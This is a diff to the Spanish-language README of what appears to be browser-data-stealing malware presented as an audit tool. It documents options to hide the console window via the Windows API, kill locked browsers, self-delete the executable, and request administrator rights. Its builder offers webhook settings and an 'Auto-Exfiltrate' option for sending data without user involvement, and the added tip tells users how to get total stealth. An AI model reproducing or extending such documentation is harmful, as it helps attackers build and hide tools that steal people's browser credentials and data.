@@ -96,7 +96,7 @@ python main.py --stealth --output-dir "C:\temp\logs"
 | | `--output-dir` | Carpeta de salida (default: `.audit`). |
 | **Motor** | `--browser` | Filtra por un navegador específico (chrome, brave, etc). |
 | | `--delay` | Retraso inicial (segundos) antes de actuar. |
-| | `--stealth` | Oculta la ventana de consola inmediatamente al arrancar. |
+| | `--stealth` | **Modo Stealth**: Oculta la ventana de consola inmediatamente al arrancar (vía API de Windows). |
 | | `--auto-kill` | Cierra navegadores automáticamente si la base de datos está bloqueada. |
 | | `--self-destruct` | **Elimina el ejecutable** tras finalizar el ciclo. |
 | | `--no-wipe` | No borra los reportes locales tras enviarlos. |
@@ -116,6 +116,11 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 | **Webhook Timeout** | 5s - 60s | Tiempo de espera para conexiones inestables. |
 | **Auto-Exfiltrate** | Checkbox | Activa el envío automático sin intervención. |
 | **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |
+| **Mostrar Consola** | Compiler Flag | Determina si el SO crea la ventana (Console vs Windowed App). |
+| **Modo Stealth** | Runtime Flag | Oculta la ventana creada por el SO mediante código. |
+
+> [!TIP]
+> **Diferencia Técnica**: "Mostrar Consola" (Compilador) evita que la ventana se cree desde el inicio (Modo Windowed). "Modo Stealth" (Runtime) la oculta después de creada mediante la API de Windows. Para sigilo total, se recomienda dejar "Mostrar Consola" desmarcado.
 
 ---
 
